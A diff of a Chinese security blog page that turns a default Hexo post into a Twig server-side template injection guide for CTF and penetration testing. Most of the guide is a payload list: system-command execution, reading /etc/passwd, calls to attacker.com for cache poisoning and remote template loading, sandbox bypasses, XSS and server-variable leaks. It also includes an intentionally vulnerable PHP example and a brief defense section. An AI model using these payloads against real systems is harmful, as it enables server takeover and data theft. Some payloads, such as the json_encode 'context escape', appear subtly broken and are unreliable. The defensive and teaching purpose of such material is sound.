@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Hello World | isum</title>
-  <meta name="keywords" content=" hexo ">
-  <meta name="description" content="Hello World | isum">
+  <title>SSTI-php模板引擎Twig注入全面指南 | isum</title>
+  <meta name="keywords" content=" ssti ">
+  <meta name="description" content="SSTI-php模板引擎Twig注入全面指南 | isum">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta property="og:type" content="website">
 <meta property="og:title" content="关于页">
@@ -261,9 +261,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-SSTI-php模板引擎Twig注入全面指南" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">Hello World</h1>
+        <h1 class="article-title">SSTI-php模板引擎Twig注入全面指南</h1>
     
     <div class="article-meta">
         
@@ -273,7 +273,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="other">other</a>
+            <a  data-rel="ctf">ctf</a>
             
         </span>
         
@@ -281,14 +281,14 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color5">hexo</a>
+            <a class="color5">ssti</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2025-03-24 09:04:37'>2024-04-26 11:03</time>
+            发布时间 : <time class="date" title='最后更新: 2025-03-24 09:01:52'>2025-03-24 09:01</time>
         
     </div>
     <div class="article-meta">
@@ -321,7 +321,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Quick-Start"><span class="toc-text">Quick Start</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Create-a-new-post-page"><span class="toc-text">Create a new post&#x2F;page</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Run-server"><span class="toc-text">Run server</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Generate-static-files"><span class="toc-text">Generate static files</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Deploy-to-remote-sites"><span class="toc-text">Deploy to remote sites</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text">一、基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Twig%E7%AE%80%E4%BB%8B"><span class="toc-text">1. Twig简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%BC%80%E5%8F%91%E4%B8%AD%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%9E%E4%BE%8B"><span class="toc-text">2. 开发中的代码实例</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A3%E5%B8%B8%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B"><span class="toc-text">正常使用示例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%89%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B"><span class="toc-text">有漏洞的代码示例</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%B8%97%E9%80%8F%E5%85%B3%E9%94%AE%E7%82%B9"><span class="toc-text">二、渗透关键点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%A3%80%E6%B5%8B%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-text">1. 检测注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%88%A4%E6%96%AD%E6%B2%99%E7%9B%92%E6%A8%A1%E5%BC%8F"><span class="toc-text">2. 判断沙盒模式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8EPayload"><span class="toc-text">三、漏洞利用与Payload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E9%9D%9E%E6%B2%99%E7%9B%92%E6%A8%A1%E5%BC%8F%E5%88%A9%E7%94%A8"><span class="toc-text">1. 非沙盒模式利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88%E9%9C%80exec%E5%87%BD%E6%95%B0%E5%8F%AF%E7%94%A8%EF%BC%89"><span class="toc-text">命令执行（需exec函数可用）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-text">文件读取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-self%E5%AF%B9%E8%B1%A1%EF%BC%88%E6%97%A7%E7%89%88%E6%9C%AC%EF%BC%89"><span class="toc-text">利用_self对象（旧版本）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7"><span class="toc-text">2. 沙盒绕过技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%86%85%E7%BD%AE%E8%BF%87%E6%BB%A4%E5%99%A8%E9%93%BE"><span class="toc-text">使用内置过滤器链</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%B1%9E%E6%80%A7%E6%B3%A8%E5%85%A5"><span class="toc-text">利用属性注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E7%BB%A7%E6%89%BF%E6%94%BB%E5%87%BB"><span class="toc-text">模板继承攻击</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%85%B6%E4%BB%96Payload"><span class="toc-text">3. 其他Payload</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -337,22 +337,75 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post-page"><a href="#Create-a-new-post-page" class="headerlink" title="Create a new post&#x2F;page"></a>Create a new post&#x2F;page</h3><pre><code class="bash">$ hexo new &quot;PostName&quot;
-$ hexo new page &quot;PageName&quot;
+        <h2 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h2><h3 id="1-Twig简介"><a href="#1-Twig简介" class="headerlink" title="1. Twig简介"></a>1. Twig简介</h3><p>• <strong>模板引擎</strong>：PHP的现代模板引擎，广泛用于Symfony框架。<br>• <strong>语法标签</strong>：<br>  • 变量输出：<code>&#123;&#123; variable &#125;&#125;</code><br>  • 逻辑控制：<code>&#123;% if condition %&#125;...&#123;% endif %&#125;</code><br>  • 注释：&#96;&#96;<br>• <strong>沙盒模式</strong>：默认禁用危险函数（如<code>system</code>），但需手动启用完整沙盒限制。</p>
+<h3 id="2-开发中的代码实例"><a href="#2-开发中的代码实例" class="headerlink" title="2. 开发中的代码实例"></a>2. 开发中的代码实例</h3><h4 id="正常使用示例"><a href="#正常使用示例" class="headerlink" title="正常使用示例"></a>正常使用示例</h4><pre><code class="php">// PHP控制器逻辑（安全用法）
+require_once &#39;vendor/autoload.php&#39;;
+$loader = new \Twig\Loader\ArrayLoader([
+    &#39;index&#39; =&gt; &#39;Hello, &#123;&#123; name &#125;&#125;!&#39;,
+]);
+$twig = new \Twig\Environment($loader);
+$name = htmlspecialchars($_GET[&#39;name&#39;]); // 输入过滤
+echo $twig-&gt;render(&#39;index&#39;, [&#39;name&#39; =&gt; $name]);
 </code></pre>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">$ hexo server --port==8000
-#开启访问（默认端口4000，`ctrl + c` 关闭），查看帮助（hexo server -help）
+<h4 id="有漏洞的代码示例"><a href="#有漏洞的代码示例" class="headerlink" title="有漏洞的代码示例"></a>有漏洞的代码示例</h4><pre><code class="php">// PHP控制器逻辑（危险操作！）
+$twig = new \Twig\Environment($loader);
+$user_input = $_GET[&#39;content&#39;]; // 未过滤直接传入模板
+echo $twig-&gt;render($user_input, []); // 直接渲染用户输入
 </code></pre>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">$ hexo generate
-#生成静态页面至public目录
+<hr>
+<h2 id="二、渗透关键点"><a href="#二、渗透关键点" class="headerlink" title="二、渗透关键点"></a>二、渗透关键点</h2><h3 id="1-检测注入点"><a href="#1-检测注入点" class="headerlink" title="1. 检测注入点"></a>1. 检测注入点</h3><p>• <strong>输入点</strong>：URL参数、模板动态拼接内容。<br>• <strong>检测方法</strong>：</p>
+<pre><code class="http">GET /page?param=&#123;&#123;7 * 7&#125;&#125; HTTP/1.1
 </code></pre>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash">$ hexo deploy
+<h3 id="2-判断沙盒模式"><a href="#2-判断沙盒模式" class="headerlink" title="2. 判断沙盒模式"></a>2. 判断沙盒模式</h3><p>• <strong>沙盒检测</strong>：尝试执行<code>&#123;&#123;_self.env&#125;&#125;</code>，若返回<code>null</code>或错误则沙盒已启用。<br>• <strong>版本探测</strong>：</p>
+<pre><code class="twig">&#123;&#123;constant('PHP_VERSION')&#125;&#125;  &lt;!-- 输出PHP版本 --&gt;
+&#123;&#123;_self.version&#125;&#125;            &lt;!-- 输出Twig版本 --&gt;
 </code></pre>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+<hr>
+<h2 id="三、漏洞利用与Payload"><a href="#三、漏洞利用与Payload" class="headerlink" title="三、漏洞利用与Payload"></a>三、漏洞利用与Payload</h2><h3 id="1-非沙盒模式利用"><a href="#1-非沙盒模式利用" class="headerlink" title="1. 非沙盒模式利用"></a>1. 非沙盒模式利用</h3><h4 id="命令执行（需exec函数可用）"><a href="#命令执行（需exec函数可用）" class="headerlink" title="命令执行（需exec函数可用）"></a>命令执行（需<code>exec</code>函数可用）</h4><pre><code class="twig">&#123;&#123;['id']|filter('system')&#125;&#125;       &lt;!-- 执行系统命令 --&gt;
+&#123;&#123;['cat /etc/passwd']|map('system')&#125;&#125;
+</code></pre>
+<h4 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h4><pre><code class="twig">&#123;&#123;app.request.files.get(1).__construct('/etc/passwd','')&#125;&#125;
+&#123;&#123;app.request.files.get(1).openFile.read(1000)&#125;&#125;
+</code></pre>
+<h4 id="利用-self对象（旧版本）"><a href="#利用-self对象（旧版本）" class="headerlink" title="利用_self对象（旧版本）"></a>利用<code>_self</code>对象（旧版本）</h4><pre><code class="twig">&#123;&#123;_self.env.setCache("ftp://attacker.com")&#125;&#125;
+&#123;&#123;_self.env.loadTemplate("恶意模板")&#125;&#125;
+</code></pre>
+<h3 id="2-沙盒绕过技巧"><a href="#2-沙盒绕过技巧" class="headerlink" title="2. 沙盒绕过技巧"></a>2. 沙盒绕过技巧</h3><h4 id="使用内置过滤器链"><a href="#使用内置过滤器链" class="headerlink" title="使用内置过滤器链"></a>使用内置过滤器链</h4><pre><code class="twig">&#123;&#123;['id']|filter('system')|join(',')&#125;&#125;  &lt;!-- 绕过黑名单检查 --&gt;
+</code></pre>
+<h4 id="利用属性注入"><a href="#利用属性注入" class="headerlink" title="利用属性注入"></a>利用属性注入</h4><pre><code class="twig">&#123;&#123;app.request.query.filter('system','id')&#125;&#125;
+</code></pre>
+<h4 id="模板继承攻击"><a href="#模板继承攻击" class="headerlink" title="模板继承攻击"></a>模板继承攻击</h4><pre><code class="twig">&#123;% extends "http://attacker.com/malicious.twig" %&#125; 
+</code></pre>
+<h3 id="3-其他Payload"><a href="#3-其他Payload" class="headerlink" title="3. 其他Payload"></a>3. 其他Payload</h3><p>• <strong>信息泄露</strong>：</p>
+<pre><code class="twig">&#123;&#123;app.request.server.all|join(',')&#125;&#125;  &lt;!-- 泄露服务器变量 --&gt;
+&#123;&#123;_self&#125;&#125;                             &lt;!-- 转储_self对象 --&gt;
+</code></pre>
+<p>• <strong>XSS利用</strong>：</p>
+<pre><code class="twig">&#123;&#123;'<script>alert(1)</script>'&#125;&#125;       &lt;!-- 需关闭自动转义 --&gt;
+</code></pre>
+<hr>
+<h2 id="四、防御手段"><a href="#四、防御手段" class="headerlink" title="四、防御手段"></a>四、防御手段</h2><h3 id="1-官方推荐"><a href="#1-官方推荐" class="headerlink" title="1. 官方推荐"></a>1. 官方推荐</h3><p>• <strong>启用沙盒模式</strong>：</p>
+<pre><code class="php">$policy = new \Twig\Sandbox\SecurityPolicy([], [], [], [], []);
+$twig-&gt;addExtension(new \Twig\Extension\SandboxExtension($policy, true));
+</code></pre>
+<p>• <strong>输入过滤</strong>：避免用户输入直接控制模板内容。<br>• <strong>禁用危险函数</strong>：在<code>php.ini</code>中禁用<code>system</code>、<code>exec</code>等函数。</p>
+<h3 id="2-安全配置"><a href="#2-安全配置" class="headerlink" title="2. 安全配置"></a>2. 安全配置</h3><p>• 更新至最新版本（≥Twig 3.x）。<br>• 使用白名单限制模板可访问的类和方法。<br>• 避免动态拼接模板内容。</p>
+<hr>
+<h2 id="五、绕过技巧"><a href="#五、绕过技巧" class="headerlink" title="五、绕过技巧"></a>五、绕过技巧</h2><h3 id="1-字符串拼接"><a href="#1-字符串拼接" class="headerlink" title="1. 字符串拼接"></a>1. 字符串拼接</h3><pre><code class="twig">&#123;&#123;['id']|filter('sy'~'stem')&#125;&#125;
+</code></pre>
+<h3 id="2-利用attribute函数"><a href="#2-利用attribute函数" class="headerlink" title="2. 利用attribute函数"></a>2. 利用<code>attribute</code>函数</h3><pre><code class="twig">&#123;&#123;attribute(_self, 'env')&#125;&#125;  &lt;!-- 访问受限属性 --&gt;
+</code></pre>
+<h3 id="3-上下文逃逸"><a href="#3-上下文逃逸" class="headerlink" title="3. 上下文逃逸"></a>3. 上下文逃逸</h3><pre><code class="twig">&#123;% set cmd = 'id' %&#125;
+&#123;&#123;&#123;cmd:['system']&#125;|json_encode&#125;&#125;  &lt;!-- 利用JSON解析漏洞 --&gt;
+</code></pre>
+<hr>
+<h2 id="六、总结与参考"><a href="#六、总结与参考" class="headerlink" title="六、总结与参考"></a>六、总结与参考</h2><h3 id="1-测试流程"><a href="#1-测试流程" class="headerlink" title="1. 测试流程"></a>1. 测试流程</h3><ol>
+<li>检测注入点 → 2. 判断沙盒状态 → 3. 尝试基础Payload → 4. 绕过沙盒 → 5. 提权</li>
+</ol>
+<h3 id="2-高危CVE"><a href="#2-高危CVE" class="headerlink" title="2. 高危CVE"></a>2. 高危CVE</h3><p>• <strong>CVE-2019-10911</strong>：沙盒模式绕过漏洞（影响Twig &lt;1.38.4）。<br>• <strong>CVE-2022-23614</strong>：属性注入漏洞（影响Twig &lt;3.4.3）。</p>
+<h3 id="3-参考资源"><a href="#3-参考资源" class="headerlink" title="3. 参考资源"></a>3. 参考资源</h3><p>• <a target="_blank" rel="noopener" href="https://twig.symfony.com/doc/">Twig官方文档</a><br>• <a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Template_Injection_Prevention_Cheat_Sheet.html">OWASP SSTI备忘单</a><br>• <a target="_blank" rel="noopener" href="https://www.ambionics.io/blog/twig-sandbox-bypass">Twig沙盒绕过研究</a></p>
+<hr>
+<p><strong>备注</strong>：Twig的沙盒模式相对严格，但开发者错误配置仍可能导致重大风险。渗透测试时需结合目标环境版本和过滤规则调整Payload。</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 梦里小镇落雨，开花，起风，挂霜，甚至扬起烤红薯的香气，每个墙角都能听见人们的说笑声。 </span>
